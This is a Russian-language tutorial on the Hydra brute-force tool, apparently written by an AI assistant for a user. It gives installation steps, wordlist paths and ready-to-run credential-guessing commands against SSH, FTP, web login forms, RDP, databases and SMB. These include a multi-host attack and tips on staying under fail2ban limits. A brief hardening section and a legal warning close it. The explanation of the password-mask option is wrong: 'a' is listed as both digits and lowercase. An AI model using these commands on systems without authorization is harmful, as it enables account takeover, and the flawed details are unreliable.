Вот подробная, переработанная статья с учётом вашей файловой структуры и реальных путей к словарям. Я добавил больше практических примеров, объяснил нюансы работы с разными протоколами и формами, а также структурировал информацию для удобства использования.

---

# **Hydra: Полное руководство по подбору паролей (Brute-Force)**

`hydra` — это стандарт индустрии для проведения атак методом перебора (brute-force). Она поддерживает более 50 протоколов: SSH, FTP, HTTP(S), MySQL, PostgreSQL, RDP, SMB, Telnet и многие другие. Её главное преимущество — многопоточность, что позволяет значительно ускорить процесс подбора.

---

## **1. Установка Hydra**

### **Kali Linux / Debian / Ubuntu**
```bash
sudo apt update && sudo apt install hydra hydra-gtk -y
```
*`hydra-gtk` — графическая версия (опционально).*

### **Arch Linux / BlackArch**
```bash
sudo pacman -S hydra
```

### **Fedora / RHEL / CentOS**
```bash
sudo dnf install hydra
```

### **ALT Linux / Ximper**
```bash
sudo epmi hydra
```

---

## **2. Где взять словари (Wordlists)**

Скачивай с **`https://github.com/danielmiessler/SecLists`** **SecLists** (2026.1) в `/usr/share/wordlist/SecLists-2026.1`.  
Это один из самых полных наборов словарей. Основные категории:

| Категория | Путь | Назначение |
|-----------|------|------------|
| **Passwords** | `Passwords/` | Словари паролей (rockyou, darkc0de, openwall и др.) |
| **Usernames** | `Usernames/` | Списки логинов (admin, root, пользователи) |
| **Fuzzing** | `Fuzzing/` | Для подбора путей, параметров, SQLi |
| **Payloads** | `Payloads/` | Эксплойты, инъекции |

### **Популярные файлы в `Passwords/` (у вас уже есть):**
```bash
# Огромный словарь (41 МБ) — один из лучших
/usr/share/wordlist/SecLists-2026.1/Passwords/openwall.net-all.txt

# RockYou (если нет, скачайте отдельно, но в SecLists он часто отсутствует)
# Вместо него используйте darkc0de.txt или openwall.net-all.txt

# Словарь с утечками
/usr/share/wordlist/SecLists-2026.1/Passwords/darkc0de.txt

# Часто используемые пароли
/usr/share/wordlist/SecLists-2026.1/Passwords/Most-Popular-Letter-Passes.txt

# Корпоративные пароли
/usr/share/wordlist/SecLists-2026.1/Passwords/corporate_passwords.txt

# Словари по умолчанию для устройств
ls /usr/share/wordlist/SecLists-2026.1/Passwords/Default-Credentials/
```

---

## **3. Основной синтаксис и ключевые опции**

```bash
hydra [опции] [протокол://цель] [специфичные-для-протокола-опции]
```

| Опция | Описание | Пример |
|-------|----------|--------|
| `-l` | Один логин | `-l admin` |
| `-L` | Файл со списком логинов | `-L /path/to/usernames.txt` |
| `-p` | Один пароль | `-p password123` |
| `-P` | Файл со списком паролей | `-P /path/to/passwords.txt` |
| `-C` | Файл "логин:пароль" (для атаки по списку) | `-C credentials.txt` |
| `-s` | Порт (если нестандартный) | `-s 2222` |
| `-t` | Количество потоков (по умолч. 16) | `-t 4` (снижайте, чтобы не заблокировали) |
| `-v` / `-V` | Подробный вывод | `-vV` (максимальная детализация) |
| `-o` | Сохранить результат в файл | `-o found_creds.txt` |
| `-f` | Остановиться после первого успеха | `-f` |
| `-w` | Таймаут ожидания ответа (сек) | `-w 3` |
| `-e` | Дополнительные проверки | `-e nsr` (n=null, s=логин как пароль, r=реверс логина) |
| `-M` | Файл со списком целей (для массовой атаки) | `-M targets.txt` |

---

## **4. Практические примеры атак**

### **4.1. Атака на SSH**

#### **Базовый перебор (один логин, словарь паролей)**
```bash
hydra -l root -P /usr/share/wordlist/SecLists-2026.1/Passwords/darkc0de.txt ssh://192.168.1.100 -t 4 -vV -o ssh_results.txt
```
*Опции:*  
- `-l root` — атакуем пользователя root  
- `-P ...` — используем словарь `darkc0de.txt`  
- `-t 4` — 4 потока (чтобы не вызвать блокировку fail2ban)  
- `-o` — сохраняем найденные пары в файл

#### **Перебор по списку логинов + список паролей**
```bash
hydra -L /usr/share/wordlist/SecLists-2026.1/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlist/SecLists-2026.1/Passwords/openwall.net-all.txt \
      ssh://192.168.1.100 -t 6 -vV
```

#### **SSH на нестандартном порту (например, 2222)**
```bash
hydra -l admin -P /usr/share/wordlist/SecLists-2026.1/Passwords/Most-Popular-Letter-Passes.txt \
      ssh://192.168.1.100 -s 2222 -t 4
```

#### **Использование дополнительных проверок (`-e`)**
```bash
hydra -l root -P passwords.txt -e nsr ssh://192.168.1.100
```
*`-e nsr` означает:*  
- **n** — попробовать пустой пароль  
- **s** — попробовать логин в качестве пароля (root:root)  
- **r** — попробовать реверс логина (root:toor)

---

### **4.2. Атака на FTP**

```bash
hydra -L /usr/share/wordlist/SecLists-2026.1/Usernames/ftp-users.txt \
      -P /usr/share/wordlist/SecLists-2026.1/Passwords/darkc0de.txt \
      ftp://192.168.1.100 -t 8 -vV
```

---

### **4.3. Атака на HTTP-форму (POST)**

Это самый сложный случай, так как нужно правильно составить строку запроса.

#### **Формат для HTTP-POST:**
```
http-post-form://хост/путь:параметры_запроса:индикатор_неудачи
```

#### **Пример 1: Простая форма логина**
```bash
hydra -l admin -P /usr/share/wordlist/SecLists-2026.1/Passwords/darkc0de.txt \
      192.168.1.100 http-post-form \
      "/login.php:username=^USER^&password=^PASS^:F=incorrect" \
      -vV
```
- `/login.php` — путь к форме  
- `username=^USER^&password=^PASS^` — поля формы (^USER^ и ^PASS^ заменяются на логин/пароль)  
- `F=incorrect` — если в ответе есть слово "incorrect", значит вход не удался.  
  Можно также использовать `S=success` для поиска успешного входа.

#### **Пример 2: Форма с CSRF-токеном (сложнее)**
Если в форме есть динамический токен, Hydra может не справиться напрямую. Нужно сначала вытащить токен, но есть обходной путь — указать `S=logout` или использовать `H` для заголовков.

#### **Пример 3: С указанием заголовков (User-Agent)**
```bash
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form \
      "/login.php:username=^USER^&password=^PASS^&submit=Login:H=Cookie: sessionid=abc123\nUser-Agent: Mozilla/5.0:F=incorrect"
```
*`H=` позволяет передать заголовки (разделитель `\n`).*

---

### **4.4. Атака на RDP (Windows Remote Desktop)**

```bash
hydra -l administrator -P /usr/share/wordlist/SecLists-2026.1/Passwords/darkc0de.txt \
      rdp://192.168.1.100 -t 1 -vV
```
*Важно:* RDP плохо реагирует на многопоточность, поэтому `-t 1` рекомендуется.

---

### **4.5. Атака на MySQL / PostgreSQL**

#### **MySQL**
```bash
hydra -L usernames.txt -P passwords.txt mysql://192.168.1.100 -t 4
```

#### **PostgreSQL**
```bash
hydra -L usernames.txt -P passwords.txt postgresql://192.168.1.100 -t 4
```

---

### **4.6. Атака на SMB (Windows Network Shares)**

```bash
hydra -l administrator -P /usr/share/wordlist/SecLists-2026.1/Passwords/darkc0de.txt \
      smb://192.168.1.100 -vV
```

---

### **4.7. Массовая атака (несколько целей)**

Создайте файл `targets.txt`:
```
192.168.1.101
192.168.1.102
192.168.1.103
```

Запустите:
```bash
hydra -l root -P passwords.txt -M targets.txt ssh -t 4
```

---

## **5. Расширенные возможности**

### **5.1. Использование файла с уже готовыми парами (`-C`)**
Если у вас есть файл `creds.txt` вида:
```
admin:12345
root:toor
user:password
```
```bash
hydra -C creds.txt ssh://192.168.1.100 -t 4
```

### **5.2. Рестарт атаки с чекпоинта**
Если атака прервалась, можно продолжить, указав `-R` (работает при наличии файла `hydra.restore`):
```bash
hydra -R
```

### **5.3. Генерация паролей на лету**
Используйте `-x` для генерации паролей по маске:
```bash
# Пароли от 6 до 8 символов, только цифры
hydra -l admin -x 6:8:a ssh://192.168.1.100
```
*`a` — цифры, `A` — заглавные, `a` — строчные, `1` — спецсимволы.*

---

## **6. Рекомендации по словарям**

| Тип атаки | Рекомендуемый словарь |
|-----------|----------------------|
| **Быстрая проверка** | `Most-Popular-Letter-Passes.txt` (1.5K паролей) |
| **Стандартная атака** | `darkc0de.txt` (16 МБ) |
| **Глубокая атака** | `openwall.net-all.txt` (41 МБ) |
| **Корпоративные сети** | `corporate_passwords.txt` |
| **WiFi WPA** | `Passwords/WiFi-WPA/` |
| **Устройства по умолчанию** | `Passwords/Default-Credentials/` |

**Как найти самый большой словарь:**
```bash
find /usr/share/wordlist/SecLists-2026.1/ -name "*.txt" -exec du -h {} \; | sort -rh | head -10
```

---

## **7. Защита от Hydra (для администраторов)**

Если вы защищаете сервер от атак, примите меры:

1. **Смена порта** (нестандартный порт для SSH, RDP)
2. **Запрет root-логина по SSH**:
   ```bash
   echo "PermitRootLogin no" >> /etc/ssh/sshd_config
   systemctl restart sshd
   ```
3. **Аутентификация по ключам**:
   ```bash
   PasswordAuthentication no
   ```
4. **Установка Fail2Ban** (автоблокировка после нескольких неудачных попыток):
   ```bash
   sudo apt install fail2ban
   sudo systemctl enable fail2ban
   ```
5. **Использование двухфакторной аутентификации (2FA)**

---

## **8. Юридическое предупреждение**

**Важно!**  
- Атаки без письменного разрешения владельца системы являются **незаконными** и преследуются по закону (в РФ — ст. 272 УК РФ «Неправомерный доступ к компьютерной информации»).  
- Используйте Hydra только в собственных лабораториях, CTF-соревнованиях (HackTheBox, VulnHub), на своих серверах или в рамках официального пентеста с договором.

---

## **9. Быстрая шпаргалка**

```bash
# SSH (один логин)
hydra -l root -P /usr/share/wordlist/SecLists-2026.1/Passwords/darkc0de.txt ssh://192.168.1.100 -t 4 -vV

# FTP (список логинов)
hydra -L usernames.txt -P passwords.txt ftp://192.168.1.100 -t 8

# HTTP-форма
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# RDP (один поток)
hydra -l administrator -P passwords.txt rdp://192.168.1.100 -t 1

# С дополнительными проверками
hydra -l root -P passwords.txt -e nsr ssh://192.168.1.100

# С сохранением результатов
hydra -l root -P passwords.txt ssh://192.168.1.100 -o results.txt -vV
```

---

